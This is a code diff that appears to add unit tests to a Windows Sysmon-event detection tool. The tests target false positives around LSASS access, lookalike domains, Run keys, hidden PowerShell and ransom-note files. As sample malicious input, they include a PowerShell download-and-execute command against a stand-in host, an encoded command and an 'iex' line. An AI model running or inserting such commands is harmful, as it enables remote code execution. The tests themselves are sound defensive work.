@@ -85,6 +85,78 @@ def test_office_spawning_powershell():
     assert "document_app_spawns_program" in checks_fired(events)
 
 
+# ---------- fewer false "Malicious" verdicts ----------
+
+LSASS = "C:\\Windows\\system32\\lsass.exe"
+
+
+def test_lsass_access_without_memory_read_is_not_reported():
+    # 0x1000 = basic information only (Task Manager does this); no right to read memory.
+    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage="C:\\Windows\\System32\\Taskmgr.exe",
+                    TargetImage=LSASS, GrantedAccess="0x1000")]
+    assert run_checks(events) == []
+
+
+def test_lsass_trusted_name_in_a_user_folder_is_strong():
+    fake = "C:\\Users\\bob\\AppData\\Roaming\\MsMpEng.exe"
+    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=fake, TargetImage=LSASS,
+                    GrantedAccess="0x1fffff")]
+    findings = run_checks(events)
+    assert [f["strength"] for f in findings] == ["Strong"]
+
+
+def test_lsass_real_defender_and_unknown_access():
+    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"
+    old_defender = "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=defender, TargetImage=LSASS,
+                    GrantedAccess="0x1fffff"),
+              event(2, 10, "2026-01-05 09:00:01.000", SourceImage=old_defender, TargetImage=LSASS,
+                    GrantedAccess="0x1fffff"),
+              # A missing access value still counts: unknown access to LSASS is worth a look.
+              event(3, 10, "2026-01-05 09:00:02.000", SourceImage="C:\\Users\\a\\tool.exe", TargetImage=LSASS)]
+    findings = run_checks(events)
+    assert [f["event_ids"] for f in findings] == [[3]]
+
+
+def test_lookalike_compares_only_the_main_name():
+    agent = "C:\\Program Files\\Agent\\agent.exe"
+    normal = [event(n, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName=name)
+              for n, name in enumerate(["cloud.google.com", "apply.workday.com", "offices.example.com"], start=1)]
+    assert run_checks(normal) == []
+    fake = [event(9, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName="fireeyee.com")]
+    assert [f["strength"] for f in run_checks(fake)] == ["Strong"]
+
+
+def test_discord_run_key_is_known_good():
+    discord = "C:\\Users\\analyst\\AppData\\Local\\Discord\\app-1.0.9\\Discord.exe"
+    events = [event(1, 13, "2026-01-05 09:00:00.000", Image=discord,
+                    TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Discord",
+                    Details='"C:\\Users\\analyst\\AppData\\Local\\Discord\\Update.exe" --processStart Discord.exe')]
+    assert "persistence" not in checks_fired(events)
+
+
+def test_hidden_powershell_alone_is_not_suspicious():
+    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    hidden = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{x}", Image=ps,
+                    CommandLine="powershell.exe -NoProfile -WindowStyle Hidden -File "
+                                "C:\\Program Files\\Agent\\inventory.ps1")]
+    assert run_checks(hidden) == []
+    bad_commands = ["powershell -enc " + "A" * 60,
+                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x.example/a')",
+                    "powershell -c iex $code"]
+    for number, command in enumerate(bad_commands, start=2):
+        bad = [event(number, 1, "2026-01-05 09:00:00.000", ProcessGuid=f"{{y{number}}}", Image=ps,
+                     CommandLine=command)]
+        assert [f["strength"] for f in run_checks(bad)] == ["Strong"], command
+
+
+def test_ransom_words_in_a_program_file_are_not_a_note():
+    python = "C:\\Python314\\python.exe"
+    events = [event(1, 11, "2026-01-05 09:00:00.000", Image=python,
+                    TargetFilename="C:\\Python314\\Lib\\site-packages\\Crypto\\decrypt_test.py")]
+    assert "ransom_note" not in checks_fired(events)
+
+
 # ---------- verdict and helpers ----------
 
 def test_enrichment_can_raise_suspicious_to_malicious():
